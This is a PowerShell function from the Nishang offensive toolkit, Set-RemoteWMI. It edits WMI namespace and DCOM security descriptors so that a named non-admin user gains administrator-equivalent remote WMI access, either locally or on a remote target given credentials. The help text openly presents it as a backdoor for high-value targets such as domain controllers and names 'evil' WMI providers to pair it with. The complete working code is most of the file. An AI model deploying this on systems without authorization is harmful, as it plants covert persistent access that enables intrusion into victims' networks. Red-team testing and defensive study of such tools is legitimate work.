function Set-RemoteWMI
{    
<#
.SYNOPSIS
Nishang script which can be used to modify Security Descriptors of DCOM and WMI namespaces to provide non-admin domain users access to WMI.
 
.DESCRIPTION
The script takes a username and adds permissions equivalent to Built-in Administratorsto the ACL of 
DCOM and WMI namespaces (all namespaces by default). 

The script needs elevated shell locally and administrative privileges on a remote target. 

It is possible to remove the entries added by the script by using the -Remove option. It is also possible to 
modify only a particular namespace instead of all the namespaces by using the -NameSpace parameter with -NotAllNamsespaces switch.

The script is very useful as a backdoor on any machine but more so on high value targets like Domain controllers. Can also be used with
'evil' WMI providers like https://github.com/jaredcatkinson/EvilNetConnectionWMIProvider
and https://github.com/subTee/EvilWMIProvider

.PARAMETER UserName
Username which will have remote access. 

.PARAMETER ComputerName
Target computer. Not required when the script is used locally. 

.PARAMETER Credential
Credential for the target remote computer. Not required if you already have administrative privileges on the remote computer. 

.PARAMETER Namespace
The namespace whose permissions will be modified. Default is "root" and all sub-namespaces or nested namespaces.

.PARAMETER NotAllNamespaces
Use this switch to modify permissions of only a particular namespaces and not the nested ones. 

.PARAMETER Remove
Use this switch to remove permissions added by the script.


.EXAMPLE
PS C:\> Set-RemoteWMI -UserName labuser –Verbose
Use the above command to add permissions on the local machine for labuser to access all namespaces remotely.

.EXAMPLE
PS C:\> Set-RemoteWMI -UserName labuser -ComputerName 192.168.0.34 -Credential admin -Verbose
Use the above command to add permissions on the remote machine for labuser to access all namespaces remotely.

.EXAMPLE
PS C:\> Set-RemoteWMI -UserName labuser -ComputerName 192.168.0.34 -Credential admin –namespace 'root\cimv2' -Verbose
Use the above command to add permissions on the remote machine for labuser to access root\cimv2 and nested namespaces remotely.

.EXAMPLE
PS C:\> Set-RemoteWMI -UserName labuser -ComputerName 192.168.0.34 -Credential admin –namespace 'root\cimv2' -NotAllNamespaces -Verbose
Use the above command to add permissions on the remote machine for labuser to access only root\cimv2 remotely.

.EXAMPLE
PS C:\> Set-RemoteWMI -UserName labuser -ComputerName 192.168.0.34 -Credential admin -Remove -Verbose
Remove the permissions added for labuser from the remote machine.


.LINK
https://docs.microsoft.com/en-us/dotnet/framework/wcf/diagnostics/wmi/index
https://unlockpowershell.wordpress.com/2009/11/20/script-remote-dcom-wmi-access-for-a-domain-user/
https://blogs.msdn.microsoft.com/wmi/2009/07/27/scripting-wmi-namespace-security-part-3-of-3/
https://github.com/samratashok/nishang
#>    
    [CmdletBinding()] Param(
        
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $UserName,

        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $ComputerName,

        [Parameter(Position = 2, Mandatory = $False)]
        [ValidateNotNull()]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]
        $Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Position = 3, Mandatory = $False)]
        [String]
        $Namespace = 'root',

        [Parameter(Mandatory = $False)]
        [Switch]
        $NotAllNamespaces,

        [Parameter(Mandatory = $False)]
        [Switch]
        $Remove
    )

    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent())
    if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) 
    {
        Write-Warning "Run the script as an Administrator"
        Break
    }
    $SID = (New-Object System.Security.Principal.NTAccount($UserName)).Translate([System.Security.Principal.SecurityIdentifier]).value

    #Create Full Control ACE entries for the target user
    #Check if permission is to be set on all namespaces or just the specified namespace
    if ($NotAllNamespaces)
    {
        $SDDL = "A;;CCDCLCSWRPWPRCWD;;;$SID"
    }
    else
    {
        $SDDL = "A;CI;CCDCLCSWRPWPRCWD;;;$SID"
    }
    $DCOMSDDL = "A;;CCDCLCSWRP;;;$SID"

    
    if ($ComputerName)
    {
        #Get an object of the StdRegProv class
        $RegProvider = Get-WmiObject -Namespace root\default -Class StdRegProv -List -ComputerName $ComputerName -Credential $Credential

        #Get an object of the __SystemSecurity class of target namespace which will be used to modfy permissions.
        $Security = Get-WmiObject -Namespace $Namespace -Class __SystemSecurity -List -ComputerName $ComputerName -Credential $Credential
    
        $Converter = Get-WmiObject -Namespace root\cimv2 -Class Win32_SecurityDescriptorHelper -List -ComputerName $ComputerName -Credential $Credential
    }
    else
    {
        #Get an object of the StdRegProv class
        $RegProvider = Get-WmiObject -Namespace root\default -Class StdRegProv -List

        #Get an object of the __SystemSecurity class of target namespace which will be used to modfy permissions.
        $Security = Get-WmiObject -Namespace $Namespace -Class __SystemSecurity -List
    
        $Converter = Get-WmiObject -Namespace root\cimv2 -Class Win32_SecurityDescriptorHelper -List
    }
    #Get the current settings
    $DCOM = $RegProvider.GetBinaryValue(2147483650,"Software\Microsoft\Ole","MachineLaunchRestriction").uValue
    $binarySD = @($null)
    $result = $Security.PSBase.InvokeMethod("GetSD",$binarySD)

    $outsddl = $converter.BinarySDToSDDL($binarySD[0])
    Write-Verbose "Existing ACL for namespace $Namespace is $($outsddl.SDDL)"

    $outDCOMSDDL = $converter.BinarySDToSDDL($DCOM)
    Write-Verbose "Existing ACL for DCOM is $($outDCOMSDDL.SDDL)"
    
    if (!$Remove)
    {
        #Create new SDDL for WMI namespace and DCOM
        $newSDDL = $outsddl.SDDL += "(" + $SDDL + ")"
        Write-Verbose "New ACL for namespace $Namespace is $newSDDL"
        $newDCOMSDDL = $outDCOMSDDL.SDDL += "(" + $DCOMSDDL + ")"
        Write-Verbose "New ACL for DCOM $newDCOMSDDL"
        $WMIbinarySD = $converter.SDDLToBinarySD($newSDDL)
        $WMIconvertedPermissions = ,$WMIbinarySD.BinarySD
        $DCOMbinarySD = $converter.SDDLToBinarySD($newDCOMSDDL)
        $DCOMconvertedPermissions = ,$DCOMbinarySD.BinarySD

        #Set the new values
        $result = $Security.PsBase.InvokeMethod("SetSD",$WMIconvertedPermissions)
        $result = $RegProvider.SetBinaryValue(2147483650,"Software\Microsoft\Ole","MachineLaunchRestriction", $DCOMbinarySD.binarySD)
    }

    elseif ($Remove)
    {
        Write-Verbose "Removing added entries"
        $SDDL = "(" + $SDDL + ")"
        $revertsddl = ($outsddl.SDDL).Replace($SDDL,"")
        Write-Verbose "Removing permissions for $UserName from ACL for $Namespace namespace"
        $DCOMSDDL = "(" + $DCOMSDDL + ")"
        $revertDCOMSDDL = ($outDCOMSDDL.SDDL).Replace($DCOMSDDL,"")
        Write-Verbose "Removing permissions for $UserName for DCOM"

        $WMIbinarySD = $converter.SDDLToBinarySD($revertsddl)
        $WMIconvertedPermissions = ,$WMIbinarySD.BinarySD
        $DCOMbinarySD = $converter.SDDLToBinarySD($revertDCOMSDDL)
        $DCOMconvertedPermissions = ,$DCOMbinarySD.BinarySD

        #Set the new values
        $result = $Security.PsBase.InvokeMethod("SetSD",$WMIconvertedPermissions)
        $result = $RegProvider.SetBinaryValue(2147483650,"Software\Microsoft\Ole","MachineLaunchRestriction", $DCOMbinarySD.binarySD)

        Write-Verbose "The new ACL for namespace $Namespace is $revertsddl"
        Write-Verbose "The new ACL for DCOM is $revertDCOMSDDL"
    }
}

